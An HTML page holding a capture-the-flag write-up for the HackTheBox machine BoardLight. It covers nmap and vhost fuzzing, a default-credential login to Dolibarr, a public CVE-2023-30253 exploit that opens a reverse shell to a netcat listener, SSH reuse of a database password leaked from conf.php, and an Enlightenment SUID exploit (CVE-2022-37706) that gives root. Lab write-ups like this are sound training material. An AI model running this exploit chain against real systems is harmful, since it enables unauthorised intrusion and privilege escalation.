<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: BoardLight HTB Write-Up</title>

    <meta property="og:title" content="Dawnless | BoardLight HTB Write-Up">
    <meta property="og:description" content="BoardLight HackTheBox Write-Up by Dawnl3ss. CVE-2023-30253 Dolibarr RCE + CVE-2022-37706 LPE.">
    <meta content="Dawnless" name="author">

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>

            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>

            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span>
                <span></span>
                <span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>BoardLight</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://labs.hackthebox.com/storage/avatars/7768afed979c9abe917b0c20df49ceb8.png"
                alt="BoardLight HTB"
            >
            <div class="writeup-meta">
                <h1>HTB - <span>BoardLight</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> HackTheBox</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">boot2root</span>
                    <span class="tag">privesc</span>
                    <span class="tag">web</span>
                    <span class="tag">python</span>
                    <span class="tag">CVE-2023-30253</span>
                    <span class="tag">CVE-2022-37706</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://app.hackthebox.com/machines/BoardLight" target="_blank">BoardLight</a> is an active machine on HackTheBox.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">BoardLight</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>I started by adding the machine IP address to my <code class="inline">/etc/hosts</code> file:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">dawnl3ss@parrot-sec - /etc/hosts</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">sudo vim /etc/hosts</span></pre>
            </div>

            <p>I then ran a full NMAP scan on the target to enumerate open ports:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">sudo nmap -sC -sV -p- boardlight.htb > nmap_scan.txt</span>

<span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">cat nmap_scan.txt</span>
<span class="output">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 11:43 CEST
Nmap scan report for boardlight.htb (10.10.11.11)
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="success">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</span>
| ssh-hostkey:
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
<span class="success">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span>
|_http-title: Site doesn't have a title
|_http-server-header: Apache/2.4.41 (Ubuntu)

Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds</span></pre>
            </div>

            <p>Since HTTP port 80 is open, let's explore the website. Nothing immediately interesting from a directory brute-force with FFUF. Time to fuzz for virtual hosts / subdomains.</p>

            <div class="writeup-img-wrap" data-img="https://i.imgur.com/boardlight-site1-placeholder.png">
                <img src="https://i.imgur.com/boardlight-site1-placeholder.png" alt="Main website" onerror="this.parentElement.style.display='none'">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// boardlight.htb - main page</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">wfuzz - vhost enumeration</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">wfuzz -c -w /security/tools/Kharon/ressources/wordlists/dir-enum-int-3.txt \
       -u "http://board.htb/" -H "Host: FUZZ.board.htb" --hl 517</span>

<span class="output">Target: http://board.htb/
Total requests: 220546

ID           Response   Lines    Word       Chars       Payload
=====================================================================
<span class="success">000002041:   200        149 L    504 W      6360 Ch     "crm"</span>
<span class="success">000006068:   200        149 L    504 W      6360 Ch     "CRM"</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-check-circle-outline"></i>
                <p>Found a hidden subdomain: <strong>crm.board.htb</strong> - let's investigate!</p>
            </div>
        </section>

        <!-- ACCESS -->
        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>I added the subdomain to <code class="inline">/etc/hosts</code> and navigated to it:</p>

            <div class="writeup-img-wrap" data-img="https://i.imgur.com/boardlight-site2-placeholder.png">
                <img src="https://i.imgur.com/boardlight-site2-placeholder.png" alt="Dolibarr login" onerror="this.parentElement.style.display='none'">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// crm.board.htb - Dolibarr 17.0 login page</div>
            </div>

            <p>We're greeted by a Dolibarr CRM login page. Let's test the default credentials first.</p>

            <div class="callout info">
                <i class="mdi mdi-key-outline"></i>
                <p>Default Dolibarr credentials: <code class="inline">admin:admin</code></p>
            </div>

            <div class="writeup-img-wrap" data-img="https://i.imgur.com/boardlight-site3-placeholder.png">
                <img src="https://i.imgur.com/boardlight-site3-placeholder.png" alt="Dolibarr dashboard" onerror="this.parentElement.style.display='none'">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Dolibarr - authenticated dashboard</div>
            </div>

            <div class="callout warning">
                <i class="mdi mdi-alert-outline"></i>
                <p>The default credentials worked - we're now authenticated as admin on Dolibarr 17.0.</p>
            </div>

            <p>
                Dolibarr 17.0 is vulnerable to a known RCE exploit. I found a public PoC on GitHub:
            </p>

            <div class="cve-badge">
                <i class="mdi mdi-shield-bug-outline"></i>
                CVE-2023-30253 - Dolibarr 17.0.0 Remote Code Execution
            </div>

            <p>Reference: <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" target="_blank">github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">exploit CVE-2023-30253</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="prompt">┌─[dawnl3ss@parrot]─[.../Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└──╼ [★]$</span> <span class="cmd">python3 exploit.py http://crm.board.htb admin admin 10.10.14.2 4444</span>
<span class="output">[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
<span class="warning">[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</span></span>

<span class="comment"># In a second terminal - netcat listener:</span>
<span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.11] 58592
<span class="success">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-check-decagram"></i>
                <p>Initial access obtained as <strong>www-data</strong>. Let's escalate.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>
                After some enumeration, I discovered database credentials stored in Dolibarr's
                <code class="inline">conf.php</code> configuration file:
            </p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">conf.php - leaked credentials</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="highlight">$dolibarr_main_db_user='dolibarrowner';</span>
<span class="success">$dolibarr_main_db_pass='serverfun2$2023!!';</span></pre>
            </div>

            <p>Password reuse is a common vulnerability. I attempted SSH login as <code class="inline">larissa</code> using this password:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">SSH - lateral movement to larissa</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/BoardLight]
└──╼ [★]$</span> <span class="cmd">ssh larissa@board.htb</span>
<span class="output">larissa@board.htb's password:
Last login: Mon Jun 10 04:06:55 2024 from 10.10.14.2
<span class="success">larissa@boardlight:~$</span>

larissa@boardlight:~$</span> <span class="cmd">cat user.txt</span>
<span class="success">...REDACTED...</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Now let's escalate to root.</p>
            </div>

            <p>
                Running LinPEAS revealed interesting SUID binaries on the system. I identified a privilege escalation
                vector via a known vulnerability in an Enlightenment SUID binary:
            </p>

            <div class="cve-badge">
                <i class="mdi mdi-shield-bug-outline"></i>
                CVE-2022-37706 - Enlightenment LPE (Local Privilege Escalation)
            </div>

            <p>Reference: <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" target="_blank">github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit</a></p>

            <p>I uploaded the exploit script to the target machine and executed it:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">CVE-2022-37706 - root shell</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">larissa@boardlight:/tmp$</span> <span class="cmd">./exploit.sh</span>
<span class="output">CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
<span class="warning">[+] Vulnerable SUID binary found!</span>
[+] Trying to pop a root shell!
<span class="success">[+] Enjoy the root shell :)</span>
mount: /dev/../tmp/: can't find in /etc/fstab.
<span class="success"># id</span>
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)

# cat /root/root.txt
<span class="success">1605468aaeea6710492ec1ecf77e892b</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned. GG 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>
<script src="/public/js/wtpage.js"></script>
</body>
</html>